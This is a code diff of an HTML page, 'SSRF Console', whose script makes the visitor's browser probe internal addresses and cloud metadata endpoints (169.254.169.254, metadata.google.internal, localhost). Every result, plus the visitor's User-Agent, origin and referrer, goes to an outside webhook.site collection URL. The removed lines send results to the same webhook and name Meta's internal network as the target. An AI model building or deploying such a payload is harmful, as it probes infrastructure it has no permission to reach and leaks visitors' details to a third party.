@@ -1,38 +1,78 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SSRF Console</title>
+    <style>
+        body { background: #111; color: #0f0; font-family: monospace; padding: 20px; }
+        #console { background: #000; border: 1px solid #333; padding: 15px; height: 400px; overflow-y: auto; white-space: pre-wrap; }
+        .success { color: #0f0; font-weight: bold; }
+        .error { color: #f00; }
+        .info { color: #ff0; }
+    </style>
+</head>
 <body>
-    <h2>SSRF Test</h2>
+    <h1>SSRF Console (Live)</h1>
+    <div id="console">Iniciando...</div>
+
     <script>
-        // Intentamos apuntar a un dominio interno de Meta (ej. localhost o IP interna)
-        // usando HTTPS para evitar el bloqueo de "Mixed Content"
-        const internalTargets = [
+        const consola = document.getElementById('console');
+        
+        function log(msg, className) {
+            const line = document.createElement('div');
+            line.className = className || '';
+            line.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            consola.appendChild(line);
+            consola.scrollTop = consola.scrollHeight;
+            
+            // También lo enviamos al webhook para tener registro externo
+            try {
+                fetch("https://webhook.site/e989aff5-a038-4481-bc10-b96b2a2cafde?log=" + encodeURIComponent(msg), { mode: 'no-cors' });
+            } catch(e) {}
+        }
+
+        log("Iniciando pruebas de SSRF...", "info");
+
+        // Lista de objetivos (IPs internas y metadatos de nube)
+        const targets = [
+            "http://169.254.169.254/latest/meta-data/",
+            "http://metadata.google.internal/computeMetadata/v1/",
             "https://localhost/",
             "https://127.0.0.1/",
-            "https://169.254.169.254/", // Metadatos de nube
-            "https://metadata.google.internal/"
+            "https://webhook.site/e989aff5-a038-4481-bc10-b96b2a2cafde?test=" + Date.now()
         ];
 
-        internalTargets.forEach(url => {
-            // Enviamos la petición con un timeout para medir el tiempo de respuesta
+        let completed = 0;
+        const total = targets.length;
+
+        targets.forEach(url => {
+            log(`Probando: ${url}`, "info");
             const start = performance.now();
-            fetch(url, { mode: 'no-cors' })
-                .then(() => {
+            
+            fetch(url, { mode: 'no-cors', credentials: 'omit' })
+                .then(response => {
                     const duration = performance.now() - start;
-                    // Si la petición tarda más de X segundos, puede que haya conectado
-                    fetch("https://webhook.site/e989aff5-a038-4481-bc10-b96b2a2cafde?ssrf_https=true", {
-                        method: "POST",
-                        mode: "no-cors",
-                        body: `Petición a ${url} completada en ${duration.toFixed(2)}ms`
-                    });
+                    log(`✅ Conexión exitosa a ${url} (${duration.toFixed(2)}ms)`, "success");
                 })
-                .catch((e) => {
-                    fetch("https://webhook.site/e989aff5-a038-4481-bc10-b96b2a2cafde?ssrf_https_fail=true", {
-                        method: "POST",
-                        mode: "no-cors",
-                        body: `Petición a ${url} falló: ${e.message}`
-                    });
+                .catch(error => {
+                    const duration = performance.now() - start;
+                    log(`❌ Falló ${url} (${duration.toFixed(2)}ms): ${error.message}`, "error");
+                })
+                .finally(() => {
+                    completed++;
+                    if (completed === total) {
+                        log("✅ Todas las pruebas han finalizado.", "success");
+                    }
                 });
         });
+
+        // Prueba de resolución DNS del lado del cliente (si el navegador lo permite)
+        log("Verificando información del navegador...", "info");
+        log(`User-Agent: ${navigator.userAgent}`);
+        log(`Origen: ${window.location.origin}`);
+        log(`Referer: ${document.referrer || '(vacío)'}`);
+        
     </script>
 </body>
 </html>
